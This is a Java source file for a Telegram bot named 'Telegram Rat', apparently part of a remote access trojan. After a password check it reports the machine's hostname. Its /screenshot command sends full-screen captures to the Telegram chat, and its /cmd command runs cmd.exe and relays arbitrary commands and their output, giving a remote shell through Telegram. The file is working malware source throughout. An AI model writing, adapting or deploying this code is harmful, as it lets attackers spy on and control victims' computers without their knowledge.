package de.oelschner.twolf;

import java.awt.Rectangle;
import java.awt.Robot;
import javax.swing.JTextArea;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.URL;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.HashMap;

import javax.imageio.ImageIO;

import org.apache.commons.io.FileUtils;
import org.telegram.telegrambots.api.methods.send.SendMessage;
import org.telegram.telegrambots.api.methods.send.SendPhoto;
import org.telegram.telegrambots.api.objects.Message;
import org.telegram.telegrambots.api.objects.Update;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;

public class Bot extends TelegramLongPollingBot {

	private String token;
	
	public static final String PASSWORD = Main.PASSWORD;
	
	public Bot(String token) {
		this.token = token;
	}
	
	@Override
	public String getBotUsername() {
		return "Telegram Rat";
	}

	@Override
	public void onUpdateReceived(Update update) {
		Message message = update.getMessage();
		if(message.isGroupMessage()) {
			this.handleGroupMessage(message);
		} else {
			this.handlePrivateMessage(message);
		}
	}

	@Override
	public String getBotToken() {
		return token;
	}
	
	private void handleGroupMessage(Message message) {
		SendMessage s = new SendMessage().setChatId(message.getChatId());
		s.setText("This bot is only available on Private Chat!");
		try {
			sendMessage(s);
		} catch(Exception e) {
			
		}
	}
	
	private ArrayList<Long> NChat = new ArrayList<Long>();
	private ArrayList<Long> RChat = new ArrayList<Long>();
	private HashMap<Long, BufferedWriter> cmd = new HashMap<Long, BufferedWriter>();
	private HashMap<Long, ChatFrame> chat = new HashMap<Long, ChatFrame>();
	
	private void handlePrivateMessage(Message message) {
		try {
			if(!RChat.contains(message.getChatId()) && ! NChat.contains(message.getChatId()) && !message.getText().trim().equalsIgnoreCase("/start")) {
				sendMessage(new SendMessage().setChatId(message.getChatId()).setText("unauthorized"));
				return;
			}
			if(NChat.contains(message.getChatId())) {
				NChat.remove(message.getChatId());
				if(message.getText().equals(PASSWORD)) {
					RChat.add(message.getChatId());
					
					SendMessage s = new SendMessage().setChatId(message.getChatId());
					String hostname = "null";
					try {
						hostname = InetAddress.getLocalHost().getHostName();
					} catch(Exception e) {
						e.printStackTrace();
					}
					s.setText("Connected to : " + hostname);
					sendMessage(s);
				} else {
					SendMessage s = new SendMessage().setChatId(message.getChatId());
					s.setText("Error : Wrong Password!");
					sendMessage(s);
				}
			} else if(cmd.containsKey(message.getChatId())) {
				if(message.getText().trim().equalsIgnoreCase("exit") || message.getText().trim().equalsIgnoreCase("/exit")) {
					cmd.get(message.getChatId()).write("exit");
					cmd.get(message.getChatId()).newLine();
					cmd.get(message.getChatId()).flush();
					cmd.remove(message.getChatId());
				} else {
					cmd.get(message.getChatId()).write(message.getText());
					cmd.get(message.getChatId()).newLine();
					cmd.get(message.getChatId()).flush();
				}
				
			} else if(chat.containsKey(message.getChatId())) {
				if(message.getText().trim().equalsIgnoreCase("/exit")) {
					chat.get(message.getChatId()).dispose();
					chat.remove(message.getChatId());
				} else {
					chat.get(message.getChatId()).addText(message.getChatId() + " : " + message.getText() + "\n");
				}
			} else if(message.getText().trim().equalsIgnoreCase("/start")) {
				if(RChat.contains(message.getChatId())) {
					SendMessage s = new SendMessage().setChatId(message.getChatId());
					s.setText("You are already connected");
					sendMessage(s);
				} else {
					SendMessage s = new SendMessage().setChatId(message.getChatId());
					s.setText("Please Enter the Secret Password");
					sendMessage(s);
					NChat.add(message.getChatId());
				}
			} else if(message.getText().trim().equalsIgnoreCase("/screenshot")) {
				BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
				File f = Files.createTempFile("trat", ".png").toFile();
				ImageIO.write(image, "png", f);
				this.sendPhoto(new SendPhoto().setNewPhoto("Ok", new FileInputStream(f)).setChatId(message.getChatId()));
			} else if(message.getText().trim().equalsIgnoreCase("/cmd")) {	
				cmd.put(message.getChatId(), startCmd(message.getChatId()));
			} else if(message.getText().trim().equalsIgnoreCase("/chat")) {	
				chat.put(message.getChatId(), startChat(message.getChatId()));
			} else {
				SendMessage s = new SendMessage().setChatId(message.getChatId());
				s.setText("This Command is currently not supported!");
				sendMessage(s);
			}
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	private BufferedWriter startCmd(long chatId) {
		try {
		ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.redirectErrorStream(true);
        processBuilder.command("cmd.exe");
        Process process;
		process = processBuilder.start();
        System.out.println("Console Started");
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
		new Thread(() -> {
			try {
	            while(process.isAlive()) {
	            	String line;
					try {
						line = br.readLine();
						if(!(line.equals("") || line == null)) {
							sendMessage(new SendMessage().setChatId(chatId).setText(line));
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
	            }
	            System.out.println("Console Stopped");
	            process.destroy();   
			} catch(Exception e) {
				
			}
		}).start();
		return bw;
		} catch(Exception e) {
			e.printStackTrace();
			return null;
		}
	}
	
	private ChatFrame startChat(long chatId) {
		return new ChatFrame(chatId, this);
	}

}
